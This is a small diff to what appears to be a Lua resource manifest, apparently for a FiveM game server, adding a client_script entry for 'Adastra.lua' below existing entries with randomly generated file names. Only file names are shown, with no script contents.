@@ -29,3 +29,5 @@ client_script 'jZIkZfHvvt.lua'
 
 
 client_script '@renameit/xDxDxDxDxD.lua'
+
+client_script 'Adastra.lua'
